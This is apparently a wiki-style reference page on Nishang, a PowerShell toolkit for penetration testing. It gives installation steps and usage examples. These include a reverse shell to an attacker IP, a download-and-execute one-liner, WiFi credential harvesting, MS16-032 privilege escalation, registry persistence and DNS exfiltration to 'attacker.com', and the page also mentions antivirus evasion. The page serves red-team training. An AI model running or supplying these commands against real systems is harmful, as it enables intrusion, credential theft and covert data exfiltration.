## Overview
Nishang is a collection of PowerShell scripts and payloads designed for offensive security operations, including penetration testing and red teaming. It provides a variety of tools and payloads for executing attacks, conducting post-exploitation tasks, and performing system enumeration and exploitation within Windows environments. Nishang is widely used by security professionals to exploit PowerShell’s capabilities and perform actions such as privilege escalation, data exfiltration, network reconnaissance, and more.

Nishang leverages the power and flexibility of PowerShell to perform these actions, making it an essential tool for attackers looking to exploit Windows environments while evading detection.

## Features
- **Execution of Payloads:** Delivers payloads for various tasks, such as reverse shells, keylogging, and privilege escalation.
- **Post-Exploitation Tools:** Includes scripts for credential harvesting, network scanning, and pivoting.
- **PowerShell Abuses:** Exploits the inherent capabilities of PowerShell for tasks like running commands, bypassing execution policies, and downloading and executing scripts remotely.
- **Persistence Mechanisms:** Provides methods for maintaining persistent access on compromised systems.
- **Data Exfiltration:** Supports data exfiltration through different channels, including HTTP, DNS, and custom protocols.
- **Antivirus Evasion:** Utilizes PowerShell obfuscation and fileless techniques to bypass antivirus detection.
- **Cross-Platform Compatibility:** While primarily for Windows, some scripts can be adapted for use with PowerShell Core on Linux and macOS.

## Website
- [Nishang GitHub Repository](https://github.com/samratashok/nishang)

## Installation

### On Windows:

1. **Clone the Nishang Repository from GitHub:**

   - Open PowerShell or Command Prompt and run:

```sh
git clone https://github.com/samratashok/nishang.git
cd nishang
```

2. **Unblock the Downloaded Scripts:**

   - PowerShell may block scripts downloaded from the internet. To unblock them, run:

```powershell
Get-ChildItem -Recurse | Unblock-File
```

3. **Import Nishang Scripts:**

   - You can directly use the scripts by importing them or running them individually in PowerShell:

```powershell
Import-Module .\PowerShellScript.ps1
```

### On Unix-based systems (Linux/macOS):

1. **Install PowerShell Core:**

   - Install PowerShell Core, as Nishang scripts require PowerShell to run.

   - **On Debian-based systems:**

```sh
sudo apt-get install -y powershell
```

   - **On macOS using Homebrew:**

```sh
brew install --cask powershell
```

2. **Clone the Nishang Repository:**

```sh
git clone https://github.com/samratashok/nishang.git
cd nishang
```

3. **Run PowerShell Core and Import Scripts:**

```sh
pwsh
Import-Module ./PowerShellScript.ps1
```

## Basic Usage
Nishang provides a variety of PowerShell scripts and payloads that can be used for different tasks. Here are some common commands and usage examples:

### Reverse Shell
To execute a reverse shell using PowerShell:

1. **Run the Reverse Shell Script:**

   - Modify the script with your attacking IP address and port, then execute:

```powershell
.\Shells\Invoke-PowerShellTcp.ps1 -Reverse -IPAddress <attacker-ip> -Port 4444
```

- **`Invoke-PowerShellTcp.ps1`**: Initiates a reverse TCP shell to the attacker's IP and port.

### Payload Delivery
To deliver and execute a payload remotely:

1. **Host the Payload on a Web Server:**

   - Place your PowerShell script on a web server that the target can access.

2. **Use Nishang to Download and Execute:**

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://<attacker-ip>/payload.ps1')
```

- **`IEX`**: Short for `Invoke-Expression`, which executes the downloaded script.

### Credential Harvesting
To harvest credentials using Nishang:

1. **Run the Credential Harvesting Script:**

```powershell
.\Gather\Invoke-WiFiCredentials.ps1
```

- **`Invoke-WiFiCredentials.ps1`**: Harvests WiFi credentials stored on the system.

### Privilege Escalation
To escalate privileges using Nishang:

1. **Run the Privilege Escalation Script:**

```powershell
.\Escalation\Invoke-MS16-032.ps1
```

- **`Invoke-MS16-032.ps1`**: Exploits a known vulnerability to escalate privileges.

### Persistence Mechanisms
To establish persistence on a compromised system:

1. **Run the Persistence Script:**

```powershell
.\Persistence\Invoke-Persistence.ps1 -Registry -Daily -At 9am
```

- **`Invoke-Persistence.ps1`**: Creates a scheduled task or registry entry for persistence.

### Data Exfiltration
To exfiltrate data using DNS:

1. **Run the DNS Exfiltration Script:**

```powershell
.\Exfiltration\Invoke-DNSExfiltrator.ps1 -Data 'SensitiveData' -Domain 'attacker.com'
```

- **`Invoke-DNSExfiltrator.ps1`**: Exfiltrates data over DNS queries to a specified domain.

## Key Features and Scripts

### Reverse Shells
- **Description:** Executes reverse TCP/UDP shells and binds shells to connect back to the attacker's system.
- **Usage:**
```powershell
.\Shells\Invoke-PowerShellTcp.ps1 -Reverse -IPAddress <attacker-ip> -Port 4444
```

### Payload Delivery
- **Description:** Downloads and executes scripts and binaries remotely using PowerShell.
- **Usage:**
```powershell
IEX (New-Object Net.WebClient).DownloadString('http://<attacker-ip>/payload.ps1')
```

### Credential Harvesting
- **Description:** Harvests stored credentials from the system, including WiFi credentials, browser passwords, and more.
- **Usage:**
```powershell
.\Gather\Invoke-WiFiCredentials.ps1
```

### Privilege Escalation
- **Description:** Exploits known vulnerabilities to escalate privileges on the compromised system.
- **Usage:**
```powershell
.\Escalation\Invoke-MS16-032.ps1
```

### Persistence Mechanisms
- **Description:** Establishes persistence on a compromised system through scheduled tasks, registry modifications, and more.
- **Usage:**
```powershell
.\Persistence\Invoke-Persistence.ps1 -Registry -Daily -At 9am
```

### Data Exfiltration
- **Description:** Exfiltrates data over different protocols like HTTP, DNS, etc., to avoid detection and bypass network monitoring.
- **Usage:**
```powershell
.\Exfiltration\Invoke-DNSExfiltrator.ps1 -Data 'SensitiveData' -Domain 'attacker.com'
```

## Tools for Offensive Security Using Nishang

- **Remote Command Execution:** Use Nishang to execute remote commands and payloads for initial access and post-exploitation.
- **Credential Dumping and Harvesting:** Extract stored credentials and sensitive information from compromised systems to gain further access.
- **Privilege Escalation:** Identify and exploit privilege escalation opportunities to elevate access and control within a network.
- **Persistence:** Establish persistent access to compromised systems to maintain long-term control and continue operations.
- **Data Exfiltration:** Exfiltrate sensitive data through covert channels to avoid detection by network monitoring tools.
- **Antivirus Evasion:** Use PowerShell obfuscation techniques and fileless payloads to bypass antivirus and endpoint detection systems.

## Best Practices
- **Use Nishang Responsibly:** Always ensure that you have proper authorization before using Nishang for offensive security tasks and post-exploitation activities.
- **Stay Within Legal Boundaries:** Be aware of the legal implications of using offensive security tools and ensure compliance with local laws and regulations.
- **Combine with Other Tools:** Use Nishang alongside other post-exploitation tools like [[PowerSploit]], [[Empire]], and [[Metasploit]] for comprehensive assessments.
- **Regularly Update Nishang:** Keep Nishang up-to-date to benefit from the latest features, security enhancements, and bug fixes.
- **Analyze Results Carefully:** Review the output of Nishang scripts carefully to identify potential vulnerabilities, misconfigurations, and opportunities for further exploitation.

## References
- [Nishang GitHub Repository](https://github.com/samratashok/nishang)
- [Nishang Documentation](https://github.com/samratashok/nishang/wiki)
- [Nishang Tutorial for Offensive Security](https://www.hackingarticles.in/nishang-powershell-for-offensive-security/)
- [Nishang Cheat Sheet](https://highon.coffee/blog/nishang-cheat-sheet/)
- [Using Nishang for Post-Exploitation on Windows](https://null-byte.wonderhowto.com/how-to/use-nishang-for-post-exploitation-on-windows-0196754/)

